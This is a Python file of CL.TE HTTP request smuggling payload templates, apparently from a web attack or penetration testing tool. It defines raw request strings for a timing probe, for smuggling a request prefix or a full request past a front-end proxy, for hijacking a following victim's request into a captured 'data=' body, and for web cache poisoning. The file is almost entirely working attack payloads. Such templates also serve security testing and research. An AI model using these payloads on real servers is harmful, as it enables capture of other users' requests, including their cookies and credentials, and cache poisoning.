"""
CL.TE Payload Templates

Content-Length prioritized by front-end, Transfer-Encoding by back-end.
"""

# Basic timing probe
# CL tells front-end request is complete, but back-end waits for chunk terminator
TIMING_PROBE = """POST {path} HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

1
Z
Q"""

# Request prefix smuggle
# Smuggles a partial request that gets prepended to victim's request
PREFIX_SMUGGLE = """POST {path} HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: {content_length}
Transfer-Encoding: chunked

0

{smuggled_prefix}"""

# Complete request smuggle
FULL_REQUEST_SMUGGLE = """POST {path} HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: {content_length}
Transfer-Encoding: chunked

0

GET {smuggled_path} HTTP/1.1
Host: {host}

"""

# Request hijacking template
REQUEST_HIJACK = """POST {path} HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: {content_length}
Transfer-Encoding: chunked

0

POST {capture_path} HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

data="""

# Cache poisoning template
CACHE_POISON = """POST {path} HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: {content_length}
Transfer-Encoding: chunked

0

GET {cache_path} HTTP/1.1
Host: {host}
X-Ignore: """
